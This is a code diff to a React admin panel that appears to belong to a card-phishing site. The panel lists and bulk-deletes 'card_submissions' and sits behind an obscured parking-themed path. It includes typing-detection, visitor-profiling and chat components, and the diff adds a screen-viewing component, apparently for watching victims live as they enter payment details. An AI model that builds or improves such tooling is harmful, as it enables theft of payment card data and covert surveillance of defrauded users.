@@ -2,10 +2,10 @@
 import React, { useState, useEffect } from 'react';
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from './ui/table';
 import { supabase } from '@/integrations/supabase/client';
+import ScreenViewer from './ScreenViewer';
 import TypingDetector from './TypingDetector';
 import EnhancedVisitorInfo from './EnhancedVisitorInfo';
 import AdminChat from './AdminChat';
-import LiveVisitorNotification from './LiveVisitorNotification';
 
 interface CardSubmission {
   id: string;
@@ -211,26 +211,22 @@ const AdminPanel = () => {
         const { error } = await supabase
           .from('card_submissions')
           .delete()
-          .gt('created_at', '1900-01-01'); // Delete all records
+          .neq('id', '00000000-0000-0000-0000-000000000000'); // Delete all records
         
         if (error) {
           console.error('Error deleting transactions:', error);
-          showNotification('Error deleting transactions');
         } else {
           setCardSubmissions([]);
           showNotification('All transactions deleted');
         }
       } catch (error) {
         console.error('Error deleting transactions:', error);
-        showNotification('Error deleting transactions');
       }
     }
   };
 
   return (
     <div className="min-h-screen bg-gray-900 text-white p-6">
-      <LiveVisitorNotification />
-      
       <div className="flex justify-between items-center mb-8">
         <h1 className="text-3xl font-bold">Admin Panel - /parking55009hvSweJimbs5hhinbd56y</h1>
         <button
@@ -260,6 +256,7 @@ const AdminPanel = () => {
       </div>
 
       {/* Advanced Features */}
+      <ScreenViewer />
       <TypingDetector />
       <EnhancedVisitorInfo />
       <AdminChat />
